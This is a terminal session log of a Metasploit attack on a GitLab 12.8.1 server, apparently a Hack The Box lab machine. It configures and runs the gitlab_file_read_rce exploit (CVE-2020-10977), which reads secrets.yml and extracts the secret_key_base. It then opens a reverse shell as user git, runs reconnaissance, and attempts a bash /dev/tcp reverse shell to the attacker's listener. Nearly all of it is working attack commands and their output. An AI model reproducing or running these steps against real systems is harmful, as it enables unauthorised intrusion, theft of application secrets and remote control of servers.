Script started on 2021-03-22 07:34:52-04:00 [TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="157" LINES="33"]
[1m[7m#[27m[1m[0m                                                                                                                                                             [0m[27m[24m[J[01;32mâ†’ [36mexploit[00m [1m[38;5;152m10.10.14.39[39m[0m[38;5;31m
â¯ [39m[K[?1h=[?2004hs lls[?1l>[?2004l
cve_2020_10977.py  metasploit.log
[1m[7m#[27m[1m[0m                                                                                                                                                             [0m[27m[24m[J[01;32mâ†’ [36mexploit[00m [1m[38;5;152m10.10.14.39[39m[0m[38;5;31m
â¯ [39m[K[?1h=[?2004hmmsf-  -q  console[1m [0m[0m -q[?1l>[?2004l
[?1034h[4mmsf6[0m [0m> search gitlab
[0m
Matching Modules
================

   #  Name                                                        Disclosure Date  Rank       Check  Description
   -  ----                                                        ---------------  ----       -----  -----------
   0  auxiliary/dos/dns/bind_tsig_badtime                         2020-05-19       normal     No     BIND TSIG Badtime Query Denial of Service
   1  auxiliary/scanner/http/[45mgitlab[0m_login                                          normal     No     [45mGitLab[0m Login Utility
   2  auxiliary/scanner/http/[45mgitlab[0m_user_enum                     2014-11-21       normal     No     [45mGitLab[0m User Enumeration
   3  auxiliary/scanner/ssh/ssh_enum_git_keys                                      normal     No     Test SSH Github Access
   4  exploit/linux/local/network_manager_vpnc_username_priv_esc  2018-07-26       [32mexcellent[0m  Yes    Network Manager VPNC Username Privilege Escalation
   5  exploit/multi/http/[45mgitlab[0m_file_read_rce                     2020-03-26       [32mexcellent[0m  Yes    [45mGitLab[0m File Read Remote Code Execution
   6  exploit/multi/http/[45mgitlab[0m_shell_exec                        2013-11-04       [32mexcellent[0m  Yes    [45mGitlab[0m-shell Code Execution
   7  post/windows/gather/psreadline_history                                       normal     No     Windows Gather PSReadline History


Interact with a module by name or index. For example [32minfo 7[0m, [32muse 7[0m or [32muse post/windows/gather/psreadline_history[0m

[4mmsf6[0m [0m> exploit/multi/http/gitlab_file_read_rceuexploit/multi/http/gitlab_file_read_rcesexploit/multi/http/gitlab_file_read_rce[Cexploit/multi/http/gitlab_file_read_rce exploit/multi/http/gitlab_file_read_rce[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
[0m[1m[34m[*][0m No payload configured, defaulting to generic/shell_reverse_tcp
[4mmsf6[0m exploit([1m[31mmulti/http/gitlab_file_read_rce[0m) [0m> so[Khow options
[0m
Module options (exploit/multi/http/gitlab_file_read_rce):

   Name             Current Setting                              Required  Description
   ----             ---------------                              --------  -----------
   DEPTH            15                                           yes       Define the max traversal depth
   PASSWORD                                                      no        The password for the specified username
   Proxies                                                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                                                        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path
                                                                           >'
   RPORT            80                                           yes       The target port (TCP)
   SECRETS_PATH     /opt/gitlab/embedded/service/gitlab-rails/c  yes       The path to the secrets.yml file
                    onfig/secrets.yml
   SECRET_KEY_BASE                                               no        The known secret_key_base from the secrets.yml - this skips the arbitrary file r
                                                                           ead if present
   SSL              false                                        no        Negotiate SSL/TLS for outgoing connections
   TARGETURI        /users/sign_in                               yes       The path to the vulnerable application
   USERNAME                                                      no        The username to authenticate as
   VHOST                                                         no        HTTP server virtual host


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.43.234   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


[4mmsf6[0m exploit([1m[31mmulti/http/gitlab_file_read_rce[0m) [0m> set USERNAME iamf
[0mUSERNAME => iamf
[4mmsf6[0m exploit([1m[31mmulti/http/gitlab_file_read_rce[0m) [0m> set PASSWORD iamfiamf
[0mPASSWORD => iamfiamf
[4mmsf6[0m exploit([1m[31mmulti/http/gitlab_file_read_rce[0m) [0m> set RHOSTS 10.10.10.216
[0mRHOSTS => 10.10.10.216
[4mmsf6[0m exploit([1m[31mmulti/http/gitlab_file_read_rce[0m) [0m> set RPORT 443
[0mRPORT => 443
[4mmsf6[0m exploit([1m[31mmulti/http/gitlab_file_read_rce[0m) [0m> set VHOST git.laboratory.htb
[0mVHOST => git.laboratory.htb
[4mmsf6[0m exploit([1m[31mmulti/http/gitlab_file_read_rce[0m) [0m> set LHOST tun0
[0mLHOST => tun0
[4mmsf6[0m exploit([1m[31mmulti/http/gitlab_file_read_rce[0m) [0m> set LPORT 9001
[0mLPORT => 9001
[4mmsf6[0m exploit([1m[31mmulti/http/gitlab_file_read_rce[0m) [0m> run
[0m
[1m[34m[*][0m Started reverse TCP handler on 10.10.14.39:9001 
[1m[34m[*][0m Executing automatic check (disable AutoCheck to override)
[1m[31m[-][0m Exploit aborted due to failure: unknown: Cannot reliably check exploitability. Unexpected HTTP 400 response. Enable ForceExploit to override check result.
[1m[34m[*][0m Exploit completed, but no session was created.
[4mmsf6[0m exploit([1m[31mmulti/http/gitlab_file_read_rce[0m) [0m> set SsL[K[K
set SECRETS_PATH      set SESSIONLOGGING    set SSL               set STAGERRETRYCOUNT  
set SECRET_KEY_BASE   set SIGNEDCOOKIESALT  set SSLVERSION        set STAGERRETRYWAIT   
[4mmsf6[0m exploit([1m[31mmulti/http/gitlab_file_read_rce[0m) [0m> set SSL true
[0m[1m[33m[!][0m Changing the SSL option's value may require changing RPORT!
SSL => true
[4mmsf6[0m exploit([1m[31mmulti/http/gitlab_file_read_rce[0m) [0m> set SSL truerun[K
[0m
[1m[34m[*][0m Started reverse TCP handler on 10.10.14.39:9001 
[1m[34m[*][0m Executing automatic check (disable AutoCheck to override)
[1m[32m[+][0m The target appears to be vulnerable. GitLab 12.8.1 is a vulnerable version.
[1m[34m[*][0m Logged in to user iamf
[1m[34m[*][0m Created project /iamf/XLNUPPwr
[1m[34m[*][0m Created project /iamf/XY9NbKZY
[1m[34m[*][0m Created issue /iamf/XLNUPPwr/issues/1
[1m[34m[*][0m Executing arbitrary file load
[1m[32m[+][0m File saved as: '/root/.msf4/loot/20210322073856_default_10.10.10.216_gitlab.secrets_832172.txt'
[1m[32m[+][0m Extracted secret_key_base 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
[1m[34m[*][0m NOTE: Setting the SECRET_KEY_BASE option with the above value will skip this arbitrary file read
[1m[34m[*][0m Attempting to delete project /iamf/XLNUPPwr
[1m[34m[*][0m Deleted project /iamf/XLNUPPwr
[1m[34m[*][0m Attempting to delete project /iamf/XY9NbKZY
[1m[34m[*][0m Deleted project /iamf/XY9NbKZY
[1m[34m[*][0m Command shell session 1 opened (10.10.14.39:9001 -> 10.10.10.216:46364) at 2021-03-22 07:39:00 -0400

[0mid;hostname
uid=998(git) gid=998(git) groups=998(git)
git.laboratory.htb
l pwd
/var/opt/gitlab/gitlab-rails/working
ls -l
total 0
ls l=  -la
total 8
drwx------ 2 git root 4096 Jul  2  2020 .
drwxr-xr-x 9 git root 4096 Mar 22 10:06 ..
ls /
RELEASE
assets
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
ls -la/  /
total 88
drwxr-xr-x   1 root root 4096 Jul  2  2020 .
drwxr-xr-x   1 root root 4096 Jul  2  2020 ..
-rwxr-xr-x   1 root root    0 Jul  2  2020 .dockerenv
-rw-r--r--   1 root root  157 Feb 24  2020 RELEASE
drwxr-xr-x   2 root root 4096 Feb 24  2020 assets
drwxr-xr-x   1 root root 4096 Feb 24  2020 bin
drwxr-xr-x   2 root root 4096 Apr 12  2016 boot
drwxr-xr-x   5 root root  340 Mar 22 10:06 dev
drwxr-xr-x   1 root root 4096 Jul  2  2020 etc
drwxr-xr-x   2 root root 4096 Apr 12  2016 home
drwxr-xr-x   1 root root 4096 Sep 13  2015 lib
drwxr-xr-x   2 root root 4096 Feb 12  2020 lib64
drwxr-xr-x   2 root root 4096 Feb 12  2020 media
drwxr-xr-x   2 root root 4096 Feb 12  2020 mnt
drwxr-xr-x   1 root root 4096 Feb 24  2020 opt
dr-xr-xr-x 298 root root    0 Mar 22 10:06 proc
drwx------   1 root root 4096 Jul 17  2020 root
drwxr-xr-x   1 root root 4096 Mar 22 10:06 run
drwxr-xr-x   1 root root 4096 Feb 21  2020 sbin
drwxr-xr-x   2 root root 4096 Feb 12  2020 srv
dr-xr-xr-x  13 root root    0 Mar 22 10:06 sys
drwxrwxrwt   1 root root 4096 Mar 22 10:06 tmp
drwxr-xr-x   1 root root 4096 Feb 12  2020 usr
drwxr-xr-x   1 root root 4096 Feb 12  2020 var
s ifconfig
s ip  ne  ip a
ss
which pt t ython3
/opt/gitlab/embedded/bin/python3
/opt/gitlab/embedded/bin/python3 -c 'import pty;pty.spawn(                                                          / which nc
which bash
/bin/bash
bash -c 'bash -i 0>  >* & /dev/tcp/10.10.10.14.39 1& > <  > 1>&0 ^[[D^[[D           0>&1  '
bash: /dev/tcp/10.10.10.14.39: No such file or directory
^[[B^[[A        bash -c "bash -i >& /dev/tcp/10.10.14.39/9001 0>&1"
^C
Abort session 1? [y/N]  y

[1m[34m[*][0m 10.10.10.216 - Command shell session 1 closed.  Reason: User exit
[4mmsf6[0m exploit([1m[31mmulti/http/gitlab_file_read_rce[0m) [0m> exit
[0m[1m[7m#[27m[1m[0m                                                                             [0m[27m[24m[J[01;32mâ†’ [36mexploit[00m [1m[38;5;152m10.10.14.39[39m[0m[38;5;31m
â¯ [39m[K[?1h=[?2004heexit[?1l>[?2004l

Script done on 2021-03-22 10:18:11-04:00 [COMMAND_EXIT_CODE="0"]
